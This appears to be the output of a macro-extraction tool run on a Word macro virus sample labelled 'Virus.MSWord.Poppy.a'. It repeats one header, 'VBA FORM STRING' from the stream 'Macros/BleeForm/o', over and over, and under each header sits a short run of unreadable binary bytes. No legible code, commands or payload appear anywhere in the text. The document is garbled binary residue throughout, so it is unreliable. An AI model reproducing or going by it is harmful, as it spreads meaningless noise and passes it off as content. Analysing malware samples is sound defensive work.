-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ݮ��x��P�h�y�w8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~Zx��
�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϻc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7A��nU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�9����h���|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u�$���n+�`��sOr�H����s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�,s�69�1Օ����A�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���d����_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Kk��Դ�y,f��e��nl1H�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
թ��R���I�JI�.*z�mЈ�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q4v�U�SKj��:r�Vu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2pq�3�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�}<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<~�̟20�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��T��6��*!L��@��G���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������Zz��P�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�UD�*kc2J���U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�������2�]��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q$���%�(��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sh�0w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,��4-�鸢�.k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����W<d/߯ʆ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3&�����uq���	��ij
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�.K���$�q�Q��R�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:�OǛ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ح0SH�1T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y8�B�@�&Ý�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{�v�,e��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��Qj��{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$䍹 ���G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��|�Zz�St��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MB�T`lB�	$��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�פ�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�+5M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�HUX3"`0 ($g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[�]I�%����I_=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�pQ��`)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�Y	
6��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�GD�oA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�F��G�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W鿾ѫ��H��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
gӑ=#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9PJ���Mcm�Kh�d���V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5C$`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`Hw`�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�p��zB(o7�ȫ�U�/h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�5��]5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����1�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�acS�(m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tlm�����Z��U>(]F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TU��@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f2q��Hϧ@M��Sb����i�⧬
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѻ0�V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�{�hu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��[L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S]�|�T�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?}�N#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�$���U�ݩj����J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%1�AU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�噣�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{���Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��xh�w�{:ޮ5+ܺ�F����3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U4F��#NB�V�	&,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=���Mv��5e,U4��m�܈��_n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�q����.�h����;�k������+��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b)�V�٩��"��޳
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�Z�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8tǇ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N[I��u�u)����P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)����8WhW�,A�)��Ѳ]cz�Ac����_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=���k�ޖK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�,���n����n���n��⟇��Q]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RrG��03�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5S[[Q�YQA�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!�.P����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#8'�?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Uw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T��:����i�TƊ�4�U=5;m@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�{BAC�[OR\bQ%4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ۓ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���#���Qx@dr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V�x`�	c�4�@3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z��V'K�d�7�ّ@P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӨϳT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���NB���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]?�m��]J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?N�1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�җY)Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �!���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϧ�hbL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ӝs�폯�:e���Hz�#	�����c�u;���(�9Γ]��[��G6F�b��2Hϧ��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AI/n���~�T�`d��מ~�j_}���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�q�z��r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�{��4�flU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
՚�QAL#L�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�Ps�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5�x����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8s���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E$�G�V��UR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i%f�m#�_7 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<<i[�p<h��K��ަ���<��h�35LV���S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WМ���n�%��jx��ԋ��`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӌq����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�'���]UQMG��Tv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���5�!�B҃
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RP��!vQ���\2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2^�~��k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5AU�[/��
���ce���*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'l��J�Y_(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�,K�T'��M\���u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�࠻
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R2pN2@$�����H`�VAI@�Fn�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ei��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͒z�A�.6�j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3H�����e���(L�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g8ϯX���� z�ttF����E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
